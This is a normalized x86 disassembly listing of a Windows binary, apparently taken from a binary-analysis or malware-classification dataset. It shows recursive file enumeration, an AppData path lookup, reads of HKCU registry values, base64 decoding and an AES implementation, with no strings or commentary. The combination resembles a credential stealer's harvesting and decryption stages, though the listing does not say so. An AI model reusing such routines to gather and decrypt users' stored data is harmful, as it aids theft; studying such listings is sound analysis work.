cmp [ ebp - 0x1 ] 0x0
pop ecx
lea esi [ esi + eax + 0x1 ]
jne r-xdata
lea ecx [ ebp - 0x25 ]
and ebx 0xfffffffe
call sub_40f609
push r--data
lea ecx [ ebp - 0x25 ]
or ebx 0x3
call sub_40f45c
push eax
mov eax [ ebp - 0x30 ]
add eax esi
push eax
lea ecx [ ebp - 0x18 ]
call sub_40f4c7
mov ecx eax
call sub_40f8a9
test al al
je r-xdata
jmp r-xdata
cmp esi [ ebp - 0x2c ]
jb r-xdata
mov eax [ ebp - 0x30 ]
add eax esi
push eax
call sub_411738
test eax eax
pop ecx
jbe r-xdata
mov eax [ ebp - 0x30 ]
add eax esi
push eax
call sub_411738
pop ecx
lea esi [ esi + eax + 0x1 ]
mov eax [ ebp - 0x30 ]
lea edi [ eax + esi ]
cmp [ edi ] 0x19
jbe r-xdata
push edi
call sub_411738
push eax
lea eax [ ebp - 0x18 ]
push edi
push eax
call sub_40c364
add esp 0x10
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
mov ecx [ ebp + 0x8 ]
call sub_40ec7e
lea ecx [ ebp - 0x18 ]
call sub_40f609
sub_40803d
sub esp 0x148
push ebx
push ebp
push esi
push edi
push 0x208
call sub_411051
mov ebx [ lstrcpyA@IAT ]
pop ecx
mov esi eax
mov ebp rw-data
push ebp
push esi
mov [ esp + 0x1c ] esi
call ebx
mov edi [ lstrcatA@IAT ]
push r--data
push esi
call edi
lea eax [ esp + 0x18 ]
push eax
push esi
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x148
retn
cmp [ esp + 0x44 ] 0x2e
je r-xdata
lea eax [ esp + 0x18 ]
push eax
push [ esp + 0x14 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push 0x208
call sub_411051
pop ecx
mov esi eax
push ebp
push esi
call ebx
lea eax [ esp + 0x44 ]
push eax
push esi
call edi
push [ rw-data ]
push esi
call edi
push esi
push [ esp + 0x160 ]
call sub_407ec4
pop ecx
pop ecx
push ebp
push esi
call ebx
lea eax [ esp + 0x44 ]
push eax
push esi
call edi
push [ rw-data ]
push esi
call edi
push esi
push [ esp + 0x160 ]
call sub_407f30
push esi
call sub_410d3e
mov esi [ esp + 0x20 ]
add esp 0xc
push esi
call sub_410d3e
pop ecx
push [ esp + 0x10 ]
call [ FindClose@IAT ]
sub_408124
push esi
xor eax eax
mov esi rw-data
push esi
push eax
push eax
push 0x1a
push eax
call [ SHGetFolderPathA@IAT ]
test eax eax
jne r-xdata
pop esi
retn
push [ esp + 0xc ]
push esi
call [ lstrcatA@IAT ]
push [ esp + 0x8 ]
call sub_40803d
pop ecx
sub_408153
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
push [ rw-data ]
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea ecx [ ebp - 0x20 ]
call sub_40eb9e
push [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
call sub_408124
push [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
call sub_408124
mov esi [ RegOpenKeyA@IAT ]
add esp 0x10
lea eax [ ebp - 0x4 ]
push eax
push [ rw-data ]
mov edi 0x80000001
mov ebx 0x104
push edi
mov [ ebp - 0x8 ] ebx
call esi
test eax eax
jne r-xdata
call sub_40bdbc
lea eax [ ebp - 0x4 ]
push eax
push [ rw-data ]
mov [ ebp - 0x8 ] ebx
push edi
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push 0x0
push 0x0
push [ rw-data ]
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] ebx
call sub_40ed8a
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push 0x0
push 0x0
push [ rw-data ]
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call sub_40803d
pop ecx
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call sub_40803d
pop ecx
sub_40824d
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_411738
cmp eax 0x4
pop ecx
jae r-xdata
mov cl [ esi ]
push 0x3f
pop edx
xor eax eax
or eax 0xffffffff
pop esi
retn
mov cl [ esi + 0x1 ]
push edi
push 0x3f
shl eax 0x2
pop edx
xor edi edi
inc eax
dec edx
test edx edx
jg r-xdata
add eax edi
sub edx 0x10
inc edi
test edx edx
jg r-xdata
cmp cl [ edx + rw-data ]
je r-xdata
shl edi 0xc
add eax edi
inc edi
dec edx
cmp edx 0x30
jg r-xdata
cmp cl [ edx + rw-data ]
je r-xdata
cmp cl [ edx + rw-data ]
jne r-xdata
shl edi 0x8
add eax edi
sub ecx 0x4
inc edi
test ecx ecx
jg r-xdata
cmp cl [ edx + rw-data ]
je r-xdata
cmp cl [ edx + rw-data ]
jne r-xdata
push 0x3f
pop edx
xor edi edi
shl edi 0x10
add eax edi
inc edi
dec edx
cmp edx 0x30
jg r-xdata
cmp dl [ ecx + rw-data ]
je r-xdata
cmp dl [ ecx + rw-data ]
jne r-xdata
mov dl [ esi + 0x2 ]
push 0x3f
pop ecx
xor edi edi
cmp cl [ edx + rw-data ]
je r-xdata
cmp cl [ edx + rw-data ]
jne r-xdata
mov cl [ esi + 0x3 ]
push 0x3f
pop edx
xor edi edi
pop edi
pop esi
retn
sub_40830b
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_40824d
mov ebx eax
push esi
mov [ ebp - 0x10 ] ebx
call sub_411738
pop ecx
cmp ebx eax
mov eax [ ebp + 0xc ]
pop ecx
jbe r-xdata
test ebx ebx
jbe r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov [ ebx + eax ] 0x0
or [ ebp - 0x4 ] 0xffffffff
sub [ ebp - 0x4 ] eax
push edi
lea edi [ ebx + eax - 0x1 ]
mov [ ebp - 0x8 ] 0xfffffffe
sub [ ebp - 0x8 ] eax
push 0x3
xor edx edx
lea eax [ ebx - 0x1 ]
pop ecx
div ecx
add esi 0x5
inc eax
mov [ ebp - 0xc ] eax
pop esi
pop ebx
leave
retn
mov dl al
and dl 0xf
mov [ edi ] dl
mov bl [ esi ]
xor ecx ecx
inc eax
cmp eax 0x40
jb r-xdata
and cl 0xf
shl cl 0x4
add cl dl
mov [ edi ] cl
mov cl [ esi + 0x2 ]
xor edx edx
inc ecx
cmp ecx 0x40
jb r-xdata
cmp cl [ eax + rw-data ]
je r-xdata
mov ecx [ ebp - 0x4 ]
add ecx edi
js r-xdata
inc edx
cmp edx 0x40
jb r-xdata
cmp bl [ ecx + rw-data ]
je r-xdata
mov cl [ esi + 0x3 ]
xor eax eax
shr eax 0x4
shl al 0x6
add al dl
mov [ edi - 0x1 ] al
cmp cl [ edx + rw-data ]
je r-xdata
xor edx edx
add esi 0x4
mov cl [ esi ]
inc eax
cmp eax 0x40
jb r-xdata
mov ecx [ ebp - 0x8 ]
add ecx edi
js r-xdata
inc edx
cmp edx 0x40
jb r-xdata
cmp cl [ eax + rw-data ]
je r-xdata
sub edi 0x3
dec [ ebp - 0xc ]
jne r-xdata
shr edx 0x4
shl al 0x2
add dl al
mov [ edi - 0x2 ] dl
cmp cl [ edx + rw-data ]
je r-xdata
mov cl [ esi + 0x1 ]
xor eax eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp - 0x10 ]
pop edi
sub_408417
push ebp
mov ebp esp
sub esp 0x20
or [ ebp - 0x20 ] 0xffffffff
or [ ebp - 0x18 ] 0xffffffff
xor eax eax
inc eax
push 0x5
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] eax
pop eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] eax
push 0x29
xor eax eax
cmp [ ebp + 0x8 ] eax
pop edx
mov [ ebp - 0xc ] 0xfffffffd
mov [ ebp - 0x1c ] 0x3
mov ecx edx
jle r-xdata
mov al dl
leave
retn
push esi
push edi
mov esi [ ebp + esi * 4 - 0x10 ]
lea edx [ edx + esi * 4 ]
and edx 0x8000003f
jns r-xdata
dec esi
or esi 0xfffffffc
inc esi
lea esi [ eax + 0x1 ]
mov edi esi
and edi 0x8000003f
jns r-xdata
dec edx
or edx 0xffffffc0
inc edx
jne r-xdata
dec edi
or edi 0xffffffc0
inc edi
mov eax esi
cmp eax [ ebp + 0x8 ]
jl r-xdata
cdq
and edx 0x3f
add eax edx
sar eax 0x6
and eax 0x80000003
jns r-xdata
mov esi eax
and esi 0x80000003
jns r-xdata
pop edi
pop esi
add ecx [ ebp + eax * 4 - 0x20 ]
mov edx ecx
dec eax
or eax 0xfffffffc
inc eax
sub_4084c2
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor al al
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
movzx eax [ esp + 0x4 ]
movzx ecx [ esp + 0x8 ]
movzx eax [ eax + rw-data ]
movzx ecx [ ecx + rw-data ]
add eax ecx
cdq
mov ecx 0xff
idiv ecx
mov al [ edx + rw-data ]
retn
sub_4084fc
push ebp
mov ebp esp
sub esp 0x28
lea eax [ ebp - 0x28 ]
push ebx
mov edx eax
push esi
sub ecx edx
push edi
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
mov ebx [ ecx + eax ]
and [ ebp - 0x8 ] 0x0
push 0x2
mov edi eax
pop esi
mov [ ebp - 0x10 ] 0x4
shl ecx 0x3
mov eax ebx
shr eax cl
push eax
push 0xb
call sub_4084c2
mov ecx esi
and ecx 0x80000003
jns r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
shl ecx 0x3
mov edx ebx
shr edx cl
mov [ ebp - 0x1 ] al
push edx
push 0xd
call sub_4084c2
mov cl [ ebp - 0x1 ]
xor cl al
mov [ ebp - 0x1 ] cl
mov ecx [ ebp - 0xc ]
and ecx 0x80000003
jns r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
shl ecx 0x3
mov eax ebx
shr eax cl
push eax
push 0x9
call sub_4084c2
mov cl [ ebp - 0x1 ]
xor cl al
mov [ ebp - 0x1 ] cl
mov ecx [ ebp - 0x8 ]
mov eax ebx
shr eax cl
push eax
push 0xe
call sub_4084c2
mov cl [ ebp - 0x1 ]
add [ ebp - 0x8 ] 0x8
mov esi [ ebp - 0xc ]
xor cl al
add esp 0x20
mov [ edi ] cl
inc edi
dec [ ebp - 0x10 ]
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
lea ecx [ esi - 0x1 ]
and ecx 0x80000003
lea eax [ esi + 0x1 ]
mov [ ebp - 0xc ] eax
jns r-xdata
dec [ ebp - 0x14 ]
mov eax edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
lea esi [ ebp - 0x28 ]
sub esi eax
mov [ ebp - 0x14 ] 0x4
movzx ebx [ edx + edi ]
mov ecx [ ebp - 0x8 ]
add [ ebp - 0x8 ] 0x8
shl ebx cl
or [ ebp - 0xc ] ebx
inc edi
cmp [ ebp - 0x8 ] 0x20
jl r-xdata
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
add eax 0x4
dec [ ebp - 0x14 ]
jne r-xdata
xor edi edi
mov [ eax ] edi
lea edx [ esi + eax ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
pop edi
pop esi
pop ebx
leave
retn
sub_40861d
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0xc ] 0x20
jb r-xdata
cmp [ ebp + 0xc ] 0x18
jb r-xdata
mov [ ebp + 0xc ] 0x8
push 0xe
jmp r-xdata
mov [ ebp + 0xc ] 0x4
push 0xa
mov [ ebp + 0xc ] 0x6
push 0xc
jmp r-xdata
pop eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
lea ecx [ eax * 4 + 0x4 ]
xor edx edx
test edi edi
mov [ ebp - 0x8 ] ecx
mov [ esi + 0x1e0 ] eax
mov [ ebp - 0x4 ] 0x1
jle r-xdata
cmp edi ecx
jge r-xdata
mov eax [ ebp + 0x10 ]
add eax 0x2
xor edx edx
lea eax [ esi + ecx * 4 + 0xe0 ]
mov [ ebp + 0x8 ] esi
movzx edi [ eax + 0x1 ]
movzx ebx [ eax ]
shl edi 0x8
add edi ebx
movzx ebx [ eax - 0x1 ]
shl edi 0x8
add edi ebx
movzx ebx [ eax - 0x2 ]
shl edi 0x8
add edi ebx
mov [ esi + edx * 4 ] edi
mov edi [ ebp + 0xc ]
inc edx
add eax 0x4
cmp edx edi
jl r-xdata
mov edi [ esi + edx * 4 ]
mov [ esi + edx * 4 + 0xf0 ] edi
mov edi [ eax - 0xf0 ]
mov [ eax ] edi
inc edx
add eax 0x4
cmp edx 0x4
jl r-xdata
add ecx 0xfffffffc
cmp ecx 0x4
jle r-xdata
cmp [ ebp + 0xc ] 0x6
jle r-xdata
mov eax 0xff
mov ecx ebx
and ecx eax
mov dh [ ecx + rw-data ]
mov ecx ebx
shr ecx 0x18
mov dl [ ecx + rw-data ]
mov ecx ebx
shr ecx 0x10
and ecx eax
movzx eax [ ecx + rw-data ]
mov ecx [ ebp - 0x4 ]
shl edx 0x8
or edx eax
movzx eax bh
movzx eax [ eax + rw-data ]
shl edx 0x8
or edx eax
xor edx ecx
mov ebx edx
call sub_4084b2
mov ecx [ ebp - 0x8 ]
movzx eax al
mov [ ebp - 0x4 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea edi [ esi + 0x10 ]
lea esi [ ecx - 0x5 ]
shr esi 0x2
inc esi
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
add [ ebp + 0x8 ] 0x4
xor eax ebx
mov [ esi + edi * 4 ] eax
inc edi
cmp edi ecx
jl r-xdata
cmp edx 0x4
jne r-xdata
lea eax [ edi + 0xf0 ]
push eax
mov ecx edi
call sub_4084fc
add edi 0x10
dec esi
pop ecx
jne r-xdata
mov eax edi
cdq
idiv [ ebp + 0xc ]
mov ebx [ esi + edi * 4 - 0x4 ]
test edx edx
jne r-xdata
mov eax ebx
shr eax 0x10
and eax 0xff
movzx eax [ eax + rw-data ]
mov edx ebx
shr edx 0x18
mov ah [ edx + rw-data ]
movzx edx bh
movzx edx [ edx + rw-data ]
shl eax 0x8
and ebx 0xff
or eax edx
movzx edx [ ebx + rw-data ]
shl eax 0x8
or eax edx
mov ebx eax
sub_4087c3
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
sub edx eax
mov [ ebp - 0x4 ] 0x4
movzx ebx [ edi ]
shl ebx cl
add ecx 0x8
or esi ebx
inc edi
cmp ecx 0x20
jl r-xdata
mov ecx [ edx + eax ]
xor ecx esi
mov [ eax ] ecx
add eax 0x4
dec [ ebp - 0x4 ]
jne r-xdata
xor esi esi
xor ecx ecx
pop edi
pop esi
pop ebx
leave
retn
sub_4087fd
push esi
push edi
push 0x4
sub ecx eax
sub edx eax
pop esi
mov edi [ ecx + eax ]
xor edi [ eax ]
mov [ edx + eax ] edi
add eax 0x4
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_408817
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi eax
mov edi ecx
sub edi esi
mov [ ebp - 0x8 ] 0x4
mov ecx [ ebp - 0x4 ]
add [ ebp - 0x4 ] 0x8
mov ebx eax
shr ebx cl
mov [ edx ] bl
inc edx
cmp [ ebp - 0x4 ] 0x20
jl r-xdata
add esi 0x4
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ edi + esi ]
xor eax [ esi ]
and [ ebp - 0x4 ] 0x0
pop edi
pop esi
pop ebx
leave
retn
sub_408856
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
sub esp 0x30
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x20 ]
mov edx esi
call sub_4087c3
mov eax [ esi + 0x1e0 ]
cmp eax 0x1
jle r-xdata
xor ecx ecx
add esi 0x10
dec eax
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] eax
lea eax [ ecx + rw-data ]
mov edx [ eax - 0x10 ]
mov edi [ eax - 0x20 ]
mov edx [ ebp + edx * 4 - 0x20 ]
mov eax [ eax ]
mov edi [ ebp + edi * 4 - 0x20 ]
mov eax [ ebp + eax * 4 - 0x20 ]
and edx 0xff0000
and edi 0xff00
or edx edi
and eax 0xff000000
or edx eax
movzx eax [ ebp + ecx - 0x20 ]
or edx eax
mov [ ebp + ecx - 0x30 ] edx
add ecx 0x4
cmp ecx 0x10
jl r-xdata
xor edi edi
mov ecx [ eax + rw-data ]
movzx edx [ ebp + ecx * 4 - 0x1d ]
mov ebx [ eax + rw-data ]
movzx ebx [ ebp + ebx * 4 - 0x1f ]
mov esi [ eax + rw-data ]
movzx esi [ ebp + esi * 4 - 0x1e ]
shl ebx 0x2
shl edx 0x2
mov ecx [ edx + rw-data ]
movzx edi [ edx + rw-data ]
movzx edx [ edx + rw-data ]
mov [ ebp - 0xc ] ebx
mov ebx ecx
shl ebx 0x8
or ebx edi
shl esi 0x2
xor ebx [ esi + rw-data ]
shr ecx 0x8
mov [ ebp - 0x10 ] edi
movzx edi [ esi + rw-data ]
xor ecx edi
and ecx 0xff00
shl ebx 0x10
or ebx ecx
mov ecx [ ebp - 0xc ]
mov edi [ ecx + rw-data ]
movzx ecx [ ecx + rw-data ]
shl edi 0x8
xor ebx edi
movzx edi [ ebp - 0xe ]
or edx edi
xor edx ecx
movzx ecx [ esi + rw-data ]
xor edx ecx
mov ecx [ ebp + eax - 0x20 ]
or ebx edx
and ecx 0xff
xor ebx [ ecx * 4 + rw-data ]
add eax 0x4
cmp eax 0x10
mov [ ebp + eax - 0x34 ] ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x30 ]
call sub_4087fd
add [ ebp - 0x4 ] 0x10
dec [ ebp - 0x8 ]
jne r-xdata
mov eax edi
shl eax 0x2
movzx edx [ ebp + eax - 0x2d ]
xor ebx ebx
mov bh [ edx + rw-data ]
movzx edx [ ebp + eax - 0x2e ]
lea ecx [ ebp + eax - 0x30 ]
movzx eax [ ebp + eax - 0x2f ]
mov bl [ edx + rw-data ]
movzx eax [ eax + rw-data ]
shl ebx 0x8
or ebx eax
mov eax [ ecx ]
and eax 0xff
movzx eax [ eax + rw-data ]
shl ebx 0x8
or ebx eax
inc edi
cmp edi 0x4
mov [ ecx ] ebx
jl r-xdata
mov eax [ esi + 0x1e0 ]
mov edx [ ebp + 0x10 ]
shl eax 0x4
add eax esi
lea ecx [ ebp - 0x30 ]
call sub_408817
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
mov esi [ ebp + 0x8 ]
sub_408a07
push ebp
mov ebp esp
sub esp 0x30
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
lea esi [ edi + 0x1e0 ]
mov edx [ esi ]
add edx 0xf
shl edx 0x4
add edx edi
lea eax [ ebp - 0x20 ]
call sub_4087c3
mov eax [ esi ]
dec eax
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
xor ecx ecx
add eax 0xf
shl eax 0x4
add eax edi
mov [ ebp - 0x4 ] eax
lea eax [ ecx + rw-data ]
mov edx [ eax - 0x10 ]
mov esi [ eax - 0x20 ]
mov edx [ ebp + edx * 4 - 0x20 ]
mov eax [ eax ]
mov esi [ ebp + esi * 4 - 0x20 ]
mov eax [ ebp + eax * 4 - 0x20 ]
and edx 0xff0000
and esi 0xff00
or edx esi
and eax 0xff000000
or edx eax
movzx eax [ ebp + ecx - 0x20 ]
or edx eax
mov [ ebp + ecx - 0x30 ] edx
add ecx 0x4
cmp ecx 0x10
jl r-xdata
xor esi esi
mov ecx [ eax + rw-data ]
movzx edx [ ebp + ecx * 4 - 0x1d ]
mov ebx [ eax + rw-data ]
movzx ebx [ ebp + ebx * 4 - 0x1f ]
mov esi [ eax + rw-data ]
movzx esi [ ebp + esi * 4 - 0x1e ]
shl ebx 0x2
shl edx 0x2
mov ecx [ edx + rw-data ]
movzx edi [ edx + rw-data ]
movzx edx [ edx + rw-data ]
mov [ ebp - 0xc ] ebx
mov ebx ecx
shl ebx 0x8
or ebx edi
shl esi 0x2
xor ebx [ esi + rw-data ]
shr ecx 0x8
mov [ ebp - 0x10 ] edi
movzx edi [ esi + rw-data ]
xor ecx edi
and ecx 0xff00
shl ebx 0x10
or ebx ecx
mov ecx [ ebp - 0xc ]
mov edi [ ecx + rw-data ]
movzx ecx [ ecx + rw-data ]
shl edi 0x8
xor ebx edi
movzx edi [ ebp - 0xe ]
or edx edi
xor edx ecx
movzx ecx [ esi + rw-data ]
xor edx ecx
mov ecx [ ebp + eax - 0x20 ]
or ebx edx
and ecx 0xff
xor ebx [ ecx * 4 + rw-data ]
add eax 0x4
cmp eax 0x10
mov [ ebp + eax - 0x34 ] ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x30 ]
call sub_4087fd
dec [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x10
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
mov eax esi
shl eax 0x2
movzx edx [ ebp + eax - 0x2d ]
xor ebx ebx
mov bh [ edx + rw-data ]
movzx edx [ ebp + eax - 0x2e ]
lea ecx [ ebp + eax - 0x30 ]
movzx eax [ ebp + eax - 0x2f ]
mov bl [ edx + rw-data ]
movzx eax [ eax + rw-data ]
shl ebx 0x8
or ebx eax
mov eax [ ecx ]
and eax 0xff
movzx eax [ eax + rw-data ]
shl ebx 0x8
or ebx eax
inc esi
cmp esi 0x4
mov [ ecx ] ebx
jl r-xdata
mov edx [ ebp + 0x10 ]
lea eax [ edi + 0xf0 ]
lea ecx [ ebp - 0x30 ]
call sub_408817
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
mov edi [ ebp + 0x8 ]
sub_408bc5
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
cdq
sub esp 0x20
and edx 0xf
add eax edx
push ebx
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1e4 ]
sar esi 0x4
dec eax
push edi
je r-xdata
test esi esi
jle r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x14 ]
sub edi ebx
push 0x10
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_4110cf
add esp 0xc
test esi esi
jle r-xdata
dec eax
je r-xdata
lea eax [ edi + ebx ]
push eax
push ebx
push [ ebp + 0x8 ]
call sub_408856
add esp 0xc
add ebx 0x10
dec esi
jne r-xdata
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
sub edi ebx
push 0x10
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_4110cf
add esp 0xc
test esi esi
jle r-xdata
dec eax
dec eax
je r-xdata
mov dl [ ecx + eax ]
xor [ ebp + eax - 0x10 ] dl
inc eax
cmp eax 0x10
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
push eax
push [ ebp + 0x8 ]
call sub_408856
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_4110cf
add esp 0x18
add ebx 0x10
dec esi
jne r-xdata
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
sub edi ebx
push 0x10
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_4110cf
add esp 0xc
test esi esi
jle r-xdata
dec eax
jne r-xdata
xor eax eax
lea ecx [ ebx + edi ]
jmp r-xdata
mov dl [ ecx + eax ]
xor [ ebp + eax - 0x10 ] dl
inc eax
cmp eax 0x10
jl r-xdata
push 0x10
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_4110cf
add esp 0xc
add ebx 0x10
dec esi
jne r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
sub edi ebx
push 0x10
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_4110cf
add esp 0xc
test esi esi
jle r-xdata
lea eax [ ebp - 0x10 ]
push eax
push eax
push [ ebp + 0x8 ]
call sub_408856
add esp 0xc
xor eax eax
lea ecx [ ebx + edi ]
jmp r-xdata
mov dl [ eax + edi ]
xor dl [ ebp + ecx - 0x10 ]
inc ecx
mov [ eax ] dl
inc eax
cmp ecx 0x10
jl r-xdata
dec esi
mov ebx eax
jne r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
sub edi ebx
lea eax [ ebp - 0x10 ]
push eax
push eax
push [ ebp + 0x8 ]
call sub_408856
add esp 0xc
xor ecx ecx
mov eax ebx
jmp r-xdata
mov dl [ edi + eax ]
xor dl [ ebp + ecx - 0x20 ]
inc ecx
mov [ eax ] dl
inc eax
cmp ecx 0x10
jl r-xdata
inc [ ebp - 0x1 ]
push 0x0
pop edx
push 0xe
sete dl
pop ecx
dec esi
mov ebx eax
jne r-xdata
inc [ ebp + ecx - 0x10 ]
push 0x0
pop edx
sete dl
dec ecx
jns r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_408856
add esp 0xc
xor ecx ecx
mov eax ebx
jmp r-xdata
test edx edx
je r-xdata
sub_408d97
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
sub esp 0x20
cdq
push ebx
and edx 0xf
add eax edx
push esi
push edi
mov edi eax
mov eax [ ecx + 0x1e4 ]
sar edi 0x4
dec eax
je r-xdata
test edi edi
jle r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x14 ]
sub esi ebx
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
push ecx
call sub_408a07
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
lea eax [ ebp - 0x10 ]
add esp 0xc
xor esi esi
sub ecx eax
sub edx eax
dec eax
je r-xdata
lea eax [ esi + ebx ]
push eax
push ebx
push [ ebp + 0x8 ]
call sub_408a07
add esp 0xc
add ebx 0x10
dec edi
jne r-xdata
lea eax [ ebp + esi - 0x10 ]
mov bl [ ecx + eax ]
xor bl [ eax ]
inc esi
cmp esi 0x10
mov [ edx + eax ] bl
jl r-xdata
cmp edi 0x1
jle r-xdata
push 0x10
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_4110cf
add esp 0xc
test edi edi
jle r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
sub ebx eax
lea esi [ eax + 0x10 ]
dec edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov [ ebp + 0x10 ] esi
sub [ ebp + 0x10 ] ebx
sub ebx esi
push 0x10
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_4110cf
add esp 0xc
test edi edi
jle r-xdata
dec eax
jne r-xdata
mov dl [ esi + eax - 0x10 ]
xor dl [ ebp + eax - 0x10 ]
mov [ ecx + eax ] dl
inc eax
cmp eax 0x10
jl r-xdata
add esi 0x10
dec edi
jne r-xdata
mov edx [ ebp + 0x10 ]
mov dl [ eax + edx ]
xor dl [ ebp + ecx - 0x10 ]
inc ecx
mov [ eax ] dl
inc eax
cmp ecx 0x10
jl r-xdata
push 0x10
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_4110cf
add esp 0xc
add esi 0x10
dec edi
jne r-xdata
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
sub esi ebx
push 0x10
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_4110cf
add esp 0xc
test edi edi
jle r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_408a07
add esp 0xc
xor eax eax
lea ecx [ esi + ebx ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push eax
push [ ebp + 0x8 ]
call sub_408856
add esp 0xc
xor ecx ecx
lea eax [ ebx + esi ]
jmp r-xdata
mov dl [ eax + esi ]
xor dl [ ebp + ecx - 0x10 ]
inc ecx
mov [ eax ] dl
inc eax
cmp ecx 0x10
jl r-xdata
dec edi
mov ebx eax
jne r-xdata
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
sub esi ebx
lea eax [ ebp - 0x10 ]
push eax
push eax
push [ ebp + 0x8 ]
call sub_408856
add esp 0xc
xor ecx ecx
mov eax ebx
jmp r-xdata
mov dl [ esi + eax ]
xor dl [ ebp + ecx - 0x20 ]
inc ecx
mov [ eax ] dl
inc eax
cmp ecx 0x10
jl r-xdata
inc [ ebp - 0x1 ]
push 0x0
pop edx
push 0xe
sete dl
pop ecx
dec edi
mov ebx eax
jne r-xdata
inc [ ebp + ecx - 0x10 ]
push 0x0
pop edx
sete dl
dec ecx
jns r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_408856
add esp 0xc
xor ecx ecx
mov eax ebx
jmp r-xdata
test edx edx
je r-xdata
sub_408f95
